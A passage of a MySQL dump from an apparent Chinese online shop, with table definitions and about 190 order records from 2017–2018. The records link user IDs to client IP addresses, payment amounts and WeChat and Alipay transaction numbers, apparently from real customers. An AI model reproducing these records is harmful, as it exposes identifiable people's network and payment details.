BIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtP6jqTKW1voAhN+hMZgy6UThEyqiJeIR3ONYX3y9Wd5aocvyzqHTd5VadCSZ1hqarTxpGIno+oLc6+yjFV1hxhyK2yhG639EeZzkMTD8YXojCBocpsjvrdsnSuUaTGdxubVX3Xqo1Qoi6eEs8SzjXRQTREVA7ekgJAF4q4vvjOxnq56dKwmuNzTKcPktl/v0IJnhYTrxR8Z52Q5zfRDmZKfPsWEasRey3UQVKwf0PAAOZdPR8OEFxwVWhGq9utyv580wFvBZHI/GC3YOtHm8rPOToP3Ikd3ZWYL10MMRCmI3ragxBX+5Cf5QeJIl9DAB/czDHdVkHHOGRN7vCU8LiwIDAQAB', 0, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_db`
--

CREATE TABLE IF NOT EXISTS `yjcode_db` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `money1` float DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `selluserid` int(11) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL,
  `dboksj` datetime DEFAULT NULL,
  `probh` char(50) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `orderbh` char(50) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=13 ;

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_dingdang`
--

CREATE TABLE IF NOT EXISTS `yjcode_dingdang` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `ddbh` char(50) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `uip` char(50) DEFAULT NULL,
  `money1` float DEFAULT NULL,
  `ddzt` char(50) DEFAULT NULL,
  `alipayzt` char(50) DEFAULT NULL,
  `bz` varchar(250) NOT NULL,
  `ifok` int(11) DEFAULT NULL,
  `wxddbh` char(50) DEFAULT NULL,
  `jyh` varchar(250) DEFAULT NULL,
  `carid` text,
  `sxf` float DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=397 ;

--
-- 转存表中的数据 `yjcode_dingdang`
--

INSERT INTO `yjcode_dingdang` (`id`, `bh`, `ddbh`, `userid`, `sj`, `uip`, `money1`, `ddzt`, `alipayzt`, `bz`, `ifok`, `wxddbh`, `jyh`, `carid`, `sxf`) VALUES
(4, '1488540216pay14', '1488540216|14', 14, '2017-03-03 19:23:36', '223.157.131.226', 20, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(5, '1488540224', '148854022414318', 14, '2017-03-03 19:23:44', '223.157.131.226', 20, '等待买家付款', '', '微信支付', 0, '137331890220170303192345', NULL, NULL, NULL),
(6, '1488548216pay16', '1488548216|16', 16, '2017-03-03 21:36:56', '58.16.197.93', 10, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(7, '1488548275pay16', '1488548275|16', 16, '2017-03-03 21:37:55', '58.16.197.93', 10, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(8, '1488548348pay16', '1488548348|16', 16, '2017-03-03 21:39:08', '58.16.197.93', 10, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(9, '1488554523pay16', '1488554523|16', 16, '2017-03-03 23:22:03', '58.16.197.93', 1, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(10, '1488554554pay16', '1488554554|16', 16, '2017-03-03 23:22:34', '58.16.197.93', 1, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(11, '1488554591pay16', '1488554591|16', 16, '2017-03-03 23:23:11', '58.16.197.93', 1, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(12, '1488682422', '1488682422|17', 17, '2017-03-05 10:53:42', '183.240.19.229', 1398.99, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(13, '1488699230pay16', '1488699230|16', 16, '2017-03-05 15:33:50', '58.16.197.56', 10, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(14, '1489132694pay14', '1489132694|14', 14, '2017-03-10 15:58:14', '223.157.248.198', 10, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(15, '1489133054pay14', '1489133054|14', 14, '2017-03-10 16:04:14', '223.157.248.198', 10, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(16, '1489571562', '1489571562|26', 26, '2017-03-15 17:52:42', '120.239.192.245', 1498.99, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(17, '1490784180pay31', '1490784180|31', 31, '2017-03-29 18:43:00', '120.85.86.187', 0.5, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(18, '1490949142', '1490949142|34', 34, '2017-03-31 16:32:22', '36.149.218.194', 49.99, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(19, '1491222052pay35', '1491222052|35', 35, '2017-04-03 20:20:52', '117.91.162.103', 1, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(20, '1491322336pay36', '1491322336|36', 36, '2017-04-05 00:12:16', '175.1.72.88', 1, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(21, '1491323043', '1491323043|36', 36, '2017-04-05 00:24:03', '175.1.72.88', 4.99, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(22, '1493861306', '1493861306|45', 45, '2017-05-04 09:28:26', '110.182.204.34', 4.99, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(23, '1493978031pay46', '1493978031|46', 46, '2017-05-05 17:53:51', '14.17.37.146', 78522400, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(24, '1494135091pay46', '1494135091|46', 46, '2017-05-07 13:31:31', '39.128.38.175', 12, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(25, '1494139089pay47', '1494139089|47', 47, '2017-05-07 14:38:09', '36.149.71.177', 88, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(26, '1494170883', '1494170883|48', 48, '2017-05-07 23:28:03', '118.205.173.84', 1399, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(27, '1494200047pay49', '1494200047|49', 49, '2017-05-08 07:34:07', '182.246.21.26', 1, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(28, '1494376421', '1494376421|53', 53, '2017-05-10 08:35:44', '110.75.248.112', 19.99, '交易成功', 'TRADE_SUCCESS', '', 1, NULL, '2017051021001004670234934372', NULL, NULL),
(29, '1494665558', '1494665558|31', 31, '2017-05-13 16:52:38', '116.31.126.209', 4.99, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(30, '1494681578', '149468157859538', 59, '2017-05-13 21:19:38', '101.227.207.48', 10, '等待买家付款', '', '微信支付', 0, '137331890220170513211938', NULL, NULL, NULL),
(31, '1494681586', '149468158659920', 59, '2017-05-13 21:19:46', '101.227.207.48', 10, '等待买家付款', '', '微信支付', 0, '137331890220170513211947', NULL, NULL, NULL),
(32, '1494681866', '14946818665968', 59, '2017-05-13 21:24:26', '101.227.207.48', 10, '等待买家付款', '', '微信支付', 0, '137331890220170513212426', NULL, NULL, NULL),
(33, '1494681886', '149468188659476', 59, '2017-05-13 21:24:46', '101.227.207.48', 10, '等待买家付款', '', '微信支付', 0, '137331890220170513212447', NULL, NULL, NULL),
(34, '1494682393', '149468239359180', 59, '2017-05-13 21:33:13', '117.34.13.30', 0.1, '等待买家付款', '', '微信支付', 0, '137331890220170513213313', NULL, NULL, NULL),
(35, '1494682415', '149468241559540', 59, '2017-05-13 21:33:35', '117.34.13.30', 0.1, '等待买家付款', '', '微信支付', 0, '137331890220170513213336', NULL, NULL, NULL),
(36, '1494682418', '149468241859171', 59, '2017-05-13 21:33:57', '58.211.2.78', 0.01, '交易成功', 'TRADE_SUCCESS', '微信支付', 1, '137331890220170513213338', NULL, NULL, NULL),
(37, '1494867478', '1494867478|62', 62, '2017-05-16 00:57:58', '42.236.93.26', 999.99, '等待买家付款', '', '微信支付', 0, '137331890220170516005759', NULL, NULL, NULL),
(38, '1495113939pay63', '1495113939|63', 63, '2017-05-18 21:25:39', '117.34.13.72', 10, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(39, '1495113954', '149511395463790', 63, '2017-05-18 21:25:54', '117.34.13.72', 10, '等待买家付款', '', '微信支付', 0, '137331890220170518212555', NULL, NULL, NULL),
(40, '1495113964', '149511396463915', 63, '2017-05-18 21:26:04', '58.211.2.36', 10, '等待买家付款', '', '微信支付', 0, '137331890220170518212605', NULL, NULL, NULL),
(41, '1495470762pay65', '1495470762|65', 65, '2017-05-23 00:32:42', '116.31.126.101', 1, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(42, '1495470779', '149547077965717', 65, '2017-05-23 00:32:59', '116.31.126.101', 1, '等待买家付款', '', '微信支付', 0, '137331890220170523003300', NULL, NULL, NULL),
(43, '1495470793', '149547079365172', 65, '2017-05-23 00:33:13', '116.31.126.101', 1, '等待买家付款', '', '微信支付', 0, '137331890220170523003314', NULL, NULL, NULL),
(44, '1495470807', '1495470807|65', 65, '2017-05-23 00:33:27', '116.31.126.101', 799.99, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(45, '1495990274', '1495990274|65', 65, '2017-05-29 00:51:14', '127.0.0.1', 149.99, '等待买家付款', '', '', 0, NULL, NULL, '52xcf', NULL),
(46, '1495990508', '1495990508|65', 65, '2017-05-29 00:55:08', '127.0.0.1', 469.99, '等待买家付款', '', '微信支付', 0, '20170529005508', NULL, '54xcf53xcf52xcf', NULL),
(47, '1496302645', '1496302645|66', 66, '2017-06-01 15:37:25', '127.0.0.1', 58.99, '等待买家付款', '', '', 0, NULL, NULL, '58xcf', NULL),
(48, '1497326700pay67', '1497326700|67', 67, '2017-06-13 12:05:00', '59.51.81.178', 111, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(49, '1497326709', '149732670967827', 67, '2017-06-13 12:05:09', '59.51.81.178', 111, '等待买家付款', '', '微信支付', 0, '20170613120512', NULL, NULL, NULL),
(50, '1498016504pay68', '1498016504|68', 68, '2017-06-21 11:41:44', '115.231.186.72', 50, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(51, '1498016521', '149801652168773', 68, '2017-06-21 11:42:01', '115.231.186.72', 50, '等待买家付款', '', '微信支付', 0, '20170621114204', NULL, NULL, NULL),
(52, '1498016542', '149801654268586', 68, '2017-06-21 11:42:22', '115.231.186.72', 50, '等待买家付款', '', '微信支付', 0, '20170621114222', NULL, NULL, NULL),
(53, '1498016565', '149801656568913', 68, '2017-06-21 11:42:45', '115.231.186.72', 50, '等待买家付款', '', '微信支付', 0, NULL, NULL, NULL, NULL),
(54, '1498317629pay70', '1498317629|70', 70, '2017-06-24 23:20:29', '116.31.126.101', 1, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(86, '1503102627pay93', '1503102627|93', 93, '2017-08-19 08:30:27', '182.242.169.227', 10, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(87, '1503102641', '150310264193965', 93, '2017-08-19 08:30:41', '182.242.169.227', 10, '等待买家付款', '', '微信支付', 0, '242520170819083043', NULL, NULL, NULL),
(88, '1504419960pay98', '1504419960|98', 98, '2017-09-03 14:26:00', '39.90.33.216', 10, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(89, '1504419970', '150441997098981', 98, '2017-09-03 14:26:10', '39.90.33.216', 10, '等待买家付款', '', '微信支付', 0, '242520170903142611', NULL, NULL, NULL),
(90, '1504419982', '150441998298494', 98, '2017-09-03 14:26:22', '39.90.33.216', 10, '等待买家付款', '', '微信支付', 0, '242520170903142622', NULL, NULL, NULL),
(91, '1504419995', '150441999598616', 98, '2017-09-03 14:26:35', '39.90.33.216', 10, '等待买家付款', '', '微信支付', 0, '242520170903142635', NULL, NULL, NULL),
(92, '1504603041', '1504603041|100', 100, '2017-09-05 17:17:21', '221.222.68.12', 57.99, '等待买家付款', '', '', 0, NULL, NULL, '65xcf', NULL),
(93, '1504603054', '1504603054|100', 100, '2017-09-05 17:17:34', '221.222.68.12', 57.99, '等待买家付款', '', '微信支付', 0, '242520170905171734', NULL, '65xcf', NULL),
(94, '1504603103', '1504603103|100', 100, '2017-09-05 17:18:23', '221.222.68.12', 57.99, '等待买家付款', '', '微信支付', 0, '242520170905171823', NULL, '65xcf', NULL),
(95, '1504605567', '1504605567101671', 101, '2017-09-05 17:59:27', '113.68.130.143', 1000, '等待买家付款', '', '微信支付', 0, '242520170905175927', NULL, NULL, NULL),
(96, '1504605571', '1504605571101825', 101, '2017-09-05 17:59:31', '113.68.130.143', 1000, '等待买家付款', '', '微信支付', 0, '242520170905175931', NULL, NULL, NULL),
(97, '1504605573pay101', '1504605573|101', 101, '2017-09-05 17:59:33', '113.68.130.143', 1000, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(98, '1504642750', '1504642750|102', 102, '2017-09-06 04:19:10', '125.116.208.181', 4.99, '等待买家付款', '', '', 0, NULL, NULL, '67xcf', NULL),
(99, '1504792559', '1504792559|105', 105, '2017-09-07 21:56:30', '110.75.242.136', 0.01, '交易成功', 'TRADE_SUCCESS', '', 1, NULL, '2017090721001004220241205516', '69xcf', NULL),
(100, '1504792753', '1504792753|100', 100, '2017-09-07 21:59:39', '110.75.242.154', 0.01, '交易成功', 'TRADE_SUCCESS', '', 1, NULL, '2017090721001004220241211290', '70xcf', NULL),
(101, '1504847496', '150484749694337', 94, '2017-09-08 13:11:36', '120.43.250.237', 50, '等待买家付款', '', '微信支付', 0, '242520170908131137', NULL, NULL, NULL),
(102, '1504847500', '150484750094695', 94, '2017-09-08 13:11:40', '120.43.250.237', 50, '等待买家付款', '', '微信支付', 0, '242520170908131140', NULL, NULL, NULL),
(103, '1504847502pay94', '1504847502|94', 94, '2017-09-08 13:11:42', '120.43.250.237', 50, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(104, '1504884597pay106', '1504884597|106', 106, '2017-09-08 23:29:57', '36.40.29.95', 1, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(105, '1504884611', '1504884611106105', 106, '2017-09-08 23:30:11', '36.40.29.95', 1, '等待买家付款', '', '微信支付', 0, '242520170908233011', NULL, NULL, NULL),
(106, '1504884621', '1504884621106619', 106, '2017-09-08 23:30:21', '36.40.29.95', 1, '等待买家付款', '', '微信支付', 0, '242520170908233021', NULL, NULL, NULL),
(107, '1504884624', '150488462410627', 106, '2017-09-08 23:30:24', '36.40.29.95', 1, '等待买家付款', '', '微信支付', 0, '242520170908233024', NULL, NULL, NULL),
(108, '1504884627', '1504884627106821', 106, '2017-09-08 23:30:27', '36.40.29.95', 1, '等待买家付款', '', '微信支付', 0, '242520170908233027', NULL, NULL, NULL),
(109, '1504884807', '1504884807106603', 106, '2017-09-08 23:33:27', '36.40.29.95', 1, '等待买家付款', '', '微信支付', 0, '242520170908233327', NULL, NULL, NULL),
(110, '1504884809', '1504884809106385', 106, '2017-09-08 23:33:29', '36.40.29.95', 1, '等待买家付款', '', '微信支付', 0, '242520170908233329', NULL, NULL, NULL),
(111, '1507820678pay112', '1507820678|112', 112, '2017-10-12 23:04:38', '223.87.102.31', 1, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(112, '1507820689', '1507820689112753', 112, '2017-10-12 23:04:49', '223.87.102.31', 1, '等待买家付款', '', '微信支付', 0, '242520171012230450', NULL, NULL, NULL),
(113, '1507820706', '1507820706112273', 112, '2017-10-12 23:05:06', '223.87.102.31', 1, '等待买家付款', '', '微信支付', 0, '242520171012230506', NULL, NULL, NULL),
(114, '1507820707', '1507820707112480', 112, '2017-10-12 23:05:07', '223.87.102.31', 1, '等待买家付款', '', '微信支付', 0, '242520171012230507', NULL, NULL, NULL),
(115, '1507820709', '1507820709112842', 112, '2017-10-12 23:05:09', '223.87.102.31', 1, '等待买家付款', '', '微信支付', 0, '242520171012230509', NULL, NULL, NULL),
(116, '1507903475', '1507903475113398', 113, '2017-10-13 22:04:35', '123.190.77.200', 800, '等待买家付款', '', '微信支付', 0, '242520171013220435', NULL, NULL, NULL),
(117, '1507903477', '1507903477113684', 113, '2017-10-13 22:04:37', '123.190.77.200', 800, '等待买家付款', '', '微信支付', 0, '242520171013220438', NULL, NULL, NULL),
(118, '1508213066pay114', '1508213066|114', 114, '2017-10-17 12:04:26', '58.254.108.123', 111, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(119, '1508218314', '1508218314|115', 115, '2017-10-17 13:31:54', '223.64.187.150', 799.99, '等待买家付款', '', '', 0, NULL, NULL, '71xcf', NULL),
(120, '1508297342', '1508297342|118', 118, '2017-10-18 11:29:02', '183.11.130.112', 189.99, '等待买家付款', '', '微信支付', 0, '242520171018112903', NULL, '73xcf72xcf', NULL),
(121, '1509029585', '1509029585|16', 16, '2017-10-26 22:53:05', '58.16.197.7', 49.99, '等待买家付款', '', '微信支付', 0, '242520171026225305', NULL, '75xcf', NULL),
(122, '1509029596', '1509029596|16', 16, '2017-10-26 22:53:16', '58.16.197.7', 49.99, '等待买家付款', '', '', 0, NULL, NULL, '75xcf', NULL),
(123, '1509079587', '1509079587|16', 16, '2017-10-27 12:46:27', '58.16.197.7', 54.99, '等待买家付款', '', '', 0, NULL, NULL, '76xcf75xcf', NULL),
(124, '1509154926', '1509154926120134', 120, '2017-10-28 09:42:06', '114.242.249.107', 100, '等待买家付款', '', '微信支付', 0, '242520171028094206', NULL, NULL, NULL),
(125, '1509154958', '1509154958|120', 120, '2017-10-28 09:42:38', '114.242.249.107', 999.99, '等待买家付款', '', '微信支付', 0, '242520171028094238', NULL, '77xcf', NULL),
(126, '1509154985', '1509154985|120', 120, '2017-10-28 09:43:05', '114.242.249.107', 1799.99, '等待买家付款', '', '微信支付', 0, '242520171028094305', NULL, '78xcf77xcf', NULL),
(127, '1509155080', '1509155080|120', 120, '2017-10-28 09:44:40', '114.242.249.107', 19.99, '等待买家付款', '', '微信支付', 0, '242520171028094441', NULL, '81xcf', NULL),
(128, '1509169482', '1509169482|120', 120, '2017-10-28 13:44:42', '114.242.249.107', 1298.99, '等待买家付款', '', '微信支付', 0, '242520171028134443', NULL, '83xcf77xcf', NULL),
(129, '1509169492', '1509169492|120', 120, '2017-10-28 13:44:52', '114.242.249.107', 1298.99, '等待买家付款', '', '微信支付', 0, '242520171028134452', NULL, '83xcf77xcf', NULL),
(130, '1509469625', '1509469625|122', 122, '2017-11-01 01:07:05', '183.40.1.97', 4.99, '等待买家付款', '', '', 0, NULL, NULL, '84xcf', NULL),
(131, '1509469635', '1509469635|122', 122, '2017-11-01 01:07:15', '183.40.1.97', 4.99, '等待买家付款', '', '微信支付', 0, '242520171101010715', NULL, '84xcf', NULL),
(132, '1509469650', '1509469650|122', 122, '2017-11-01 01:07:30', '183.40.1.97', 4.99, '等待买家付款', '', '', 0, NULL, NULL, '84xcf', NULL),
(133, '1509469712', '1509469712|122', 122, '2017-11-01 01:08:32', '183.40.1.97', 1403.99, '等待买家付款', '', '', 0, NULL, NULL, '85xcf84xcf', NULL),
(134, '1509601581', '1509601581|123', 123, '2017-11-02 13:46:21', '182.140.175.143', 999.99, '等待买家付款', '', '', 0, NULL, NULL, '86xcf', NULL),
(135, '1509950660', '1509950660|124', 124, '2017-11-06 14:44:20', '110.82.171.33', 19.99, '等待买家付款', '', '微信支付', 0, '242520171106144421', NULL, '87xcf', NULL),
(136, '1510996864pay111', '1510996864|111', 111, '2017-11-18 17:21:04', '58.16.124.63', 80000, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(137, '1510996911', '1510996911111825', 111, '2017-11-18 17:21:51', '58.16.124.63', 80000, '等待买家付款', '', '微信支付', 0, '242520171118172152', NULL, NULL, NULL),
(138, '1510996919', '1510996919111513', 111, '2017-11-18 17:21:59', '58.16.124.63', 80000, '等待买家付款', '', '微信支付', 0, '242520171118172159', NULL, NULL, NULL),
(139, '1510996921', '1510996921111233', 111, '2017-11-18 17:22:01', '58.16.124.63', 80000, '等待买家付款', '', '微信支付', 0, '242520171118172201', NULL, NULL, NULL),
(140, '1510996928', '1510996928111794', 111, '2017-11-18 17:22:08', '58.16.124.63', 80000, '等待买家付款', '', '微信支付', 0, '242520171118172208', NULL, NULL, NULL),
(141, '1511002667pay111', '1511002667|111', 111, '2017-11-18 18:57:47', '58.16.124.63', 20, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(142, '1511002724', '1511002724111295', 111, '2017-11-18 18:58:44', '58.16.124.63', 20, '等待买家付款', '', '微信支付', 0, '242520171118185844', NULL, NULL, NULL),
(143, '1511002729', '1511002729111622', 111, '2017-11-18 18:58:49', '58.16.124.63', 20, '等待买家付款', '', '微信支付', 0, '242520171118185849', NULL, NULL, NULL),
(144, '1511002733', '1511002733111591', 111, '2017-11-18 18:58:53', '58.16.124.63', 10, '等待买家付款', '', '微信支付', 0, '242520171118185853', NULL, NULL, NULL),
(145, '1511002737', '1511002737111903', 111, '2017-11-18 18:58:57', '58.16.124.63', 10, '等待买家付款', '', '微信支付', 0, '242520171118185858', NULL, NULL, NULL),
(146, '1511113793pay128', '1511113793|128', 128, '2017-11-20 01:49:53', '113.86.38.248', 10, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(147, '1511113804', '1511113804128560', 128, '2017-11-20 01:50:04', '113.86.38.248', 10, '等待买家付款', '', '微信支付', 0, '242520171120015004', NULL, NULL, NULL),
(148, '1511199719', '1511199719130655', 130, '2017-11-21 01:41:59', '116.8.38.248', 100, '等待买家付款', '', '微信支付', 0, '242520171121014200', NULL, NULL, NULL),
(149, '1511241841pay131', '1511241841|131', 131, '2017-11-21 13:24:01', '36.98.36.246', 100, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(150, '1511638726pay134', '1511638726|134', 134, '2017-11-26 03:38:46', '120.229.3.193', 200, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(151, '1511926013', '1511926013|136', 136, '2017-11-29 11:26:53', '1.192.177.106', 999.99, '等待买家付款', '', '', 0, NULL, NULL, '99xcf', NULL),
(152, '1512873785', '1512873785|137', 137, '2017-12-10 10:43:05', '113.225.168.54', 298.99, '等待买家付款', '', '', 0, NULL, NULL, '101xcf', NULL),
(153, '1513319197pay141', '1513319197|141', 141, '2017-12-15 14:26:37', '101.226.225.84', 12, '等待买家付款', '', '', 0, NULL, NULL, NULL, NULL),
(154, '1513319231', '1513319231141383', 141, '2017-12-15 14:27:11', '101.226.225.84', 12, '等待买家付款', '', '微信支付', 0, '242520171215142711', NULL, NULL, NULL),
(155, '1516518413', '1516518413|145', 145, '2018-01-21 15:06:53', '119.134.103.56', 57.99, '等待买家付款', '', '微信支付', 0, '242520180121150654', NULL, '106xcf', NULL),
(156, '1516518423', '1516518423|145', 145, '2018-01-21 15:07:03', '119.134.103.56', 57.99, '等待买家付款', '', '', 0, NULL, NULL, '106xcf', NULL),
(157, '1516598176', '1516598176145776', 145, '2018-01-22 13:16:16', '223.157.140.197', 100, '等待买家付款', '', '微信支付', 0, '137331890220180122131616', NULL, NULL, NULL),
(158, '1516598179', '1516598179145517', 145, '2018-01-22 13:16:19', '223.157.140.197', 100, '等待买家付款', '', '微信支付', 0, '137331890220180122131619', NULL, NULL, NULL),
(159, '1517378660', '151737866015579', 15, '2018-01-31 14:04:20', '175.2.0.178', 100, '等待买家付款', '', '微信支付', 0, '137331890220180131140420', NULL, NULL, NULL),
(160, '1517378690', '151737869015464', 15, '2018-01-31 14:05:00', '140.207.54.75', 1, '交易成功', 'TRADE_SUCCESS', '微信支付', 1, '137331890220180131140450', NULL, NULL, NULL),
(161, '1519574649', '1519574649148783', 148, '2018-02-26 00:04:09', '124.231.171.51', 10, '等待买家付款', '', '微信支付', 0, '149121862220180226000410', NULL, NULL, NULL),
(162, '1519574691', '1519574691148559', 148, '2018-02-26 00:04:51', '124.231.171.51', 10, '等待买家付款', '', '微信支付', 0, '149121862220180226000452', NULL, NULL, NULL),
(163, '1519575424', '1519575424148232', 148, '2018-02-26 00:17:19', '140.207.54.74', 1, '交易成功', 'TRADE_SUCCESS', '微信支付', 1, '149121862220180226001704', NULL, NULL, NULL),
(164, '1520758355', '1520758355|151', 151, '2018-03-11 16:52:35', '223.88.196.16', 9999.99, '等待买家付款', '', '微信支付', 0, '149121862220180311165235', NULL, '113xcf', NULL),
(165, '1522227405', '1522227405154809', 154, '2018-03-28 16:56:45', '119.4.253.191', 0.01, '等待买家付款', '', '微信支付', 0, '149121862220180328165646', NULL, NULL, NULL),
(166, '1524872916', '1524872916|159', 159, '2018-04-28 07:48:36', '175.169.152.244', 59.58, '等待买家付款', '', '微信支付', 0, '149121862220180428074837', NULL, '119xcf', 0.59),
(167, '1524873145', '1524873145159398', 159, '2018-04-28 07:52:25', '175.169.152.244', 1.01, '等待买家付款', '', '微信支付', 0, '149121862220180428075225', NULL, NULL, 0.01),
(168, '1524873148', '1524873148159472', 159, '2018-04-28 07:52:28', '175.169.152.244', 1.01, '等待买家付款', '', '微信支付', 0, '149121862220180428075228', NULL, NULL, 0.01),
(169, '1524909900', '1524909900|159', 159, '2018-04-28 18:05:00', '175.169.152.244', 159.57, '等待买家付款', '', '微信支付', 0, '149121862220180428180500', NULL, '120xcf119xcf', 1.58),
(170, '1525272388', '1525272388161984', 161, '2018-05-02 22:46:28', '183.226.21.47', 101, '等待买家付款', '', '微信支付', 0, '149121862220180502224628', NULL, NULL, 1),
(171, '1525272420', '1525272420161909', 161, '2018-05-02 22:47:00', '183.226.21.47', 101, '等待买家付款', '', '微信支付', 0, '149121862220180502224700', NULL, NULL, 1),
(172, '1525924515pay161', '1525924515|161', 161, '2018-05-10 11:55:15', '175.2.84.90', 1010, '等待买家付款', '', '', 0, NULL, NULL, NULL, 10),
(173, '1526939440pay14', '1526939440|14', 14, '2018-05-22 05:50:40', '223.74.155.45', 101, '等待买家付款', '', '', 0, NULL, NULL, NULL, 1),
(174, '1527995793', '1527995793162526', 162, '2018-06-03 11:16:33', '175.2.227.78', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(175, '1527995921', '1527995921162103', 162, '2018-06-03 11:18:41', '175.2.227.78', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(176, '1527995937pay162', '1527995937|162', 162, '2018-06-03 11:18:57', '175.2.227.78', 1.01, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.01),
(177, '1527995942', '1527995942162103', 162, '2018-06-03 11:19:28', '139.199.202.243', 1, 'suc', 'TRADE_SUCCESS', 'otherpay', 1, NULL, NULL, NULL, NULL),
(178, '1527995982', '1527995982162526', 162, '2018-06-03 11:19:42', '175.2.227.78', 10, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(179, '1527996283', '1527996283162477', 162, '2018-06-03 11:24:43', '175.2.227.78', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(180, '1527996444', '152799644415649', 15, '2018-06-03 11:28:05', '139.199.202.243', 2, 'suc', 'TRADE_SUCCESS', 'otherpay', 1, NULL, NULL, NULL, NULL),
(181, '1528190801', '152819080115724', 15, '2018-06-05 17:27:41', '139.199.202.243', 1, 'suc', 'TRADE_SUCCESS', 'otherpay', 1, NULL, NULL, NULL, NULL),
(182, '1528206845', '1528206845163292', 163, '2018-06-05 21:54:05', '175.2.85.253', 100, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(183, '1528211372', '1528211372162638', 162, '2018-06-05 23:09:32', '175.2.85.253', 10, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(184, '1528211676', '1528211676162197', 162, '2018-06-05 23:14:36', '175.2.85.253', 10, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(185, '1528211799', '1528211799162832', 162, '2018-06-05 23:16:39', '175.2.85.253', 10, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(186, '1528211867', '1528211867162135', 162, '2018-06-05 23:17:47', '175.2.85.253', 100, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(187, '1528212346', '1528212346162135', 162, '2018-06-05 23:25:46', '175.2.85.253', 11, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(188, '1528213956', '1528213956154295', 154, '2018-06-05 23:52:36', '175.2.85.253', 0.01, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(189, '1528214052', '152821405215449', 154, '2018-06-05 23:54:57', '103.60.165.162', 0.02, 'suc', 'TRADE_SUCCESS', 'otherpay', 1, NULL, NULL, NULL, NULL),
(190, '1528214365', '1528214365154150', 154, '2018-06-05 23:59:25', '175.2.85.253', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(191, '1528214375', '1528214375154198', 154, '2018-06-05 23:59:35', '175.2.85.253', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(192, '1528424360', '1528424360|164', 164, '2018-06-08 10:19:20', '49.221.17.34', 201.99, '等待买家付款', '', '', 0, NULL, NULL, '124xcf', 2),
(193, '1528424402', '1528424402|164', 164, '2018-06-08 10:20:02', '49.221.17.34', 201.99, '等待买家付款', '', '微信支付', 0, '149121862220180608102003', NULL, '124xcf', 2),
(194, '1528508533', '1528508533|165', 165, '2018-06-09 09:42:13', '124.135.235.0', 1009.99, '等待买家付款', '', '', 0, NULL, NULL, '126xcf', 10),
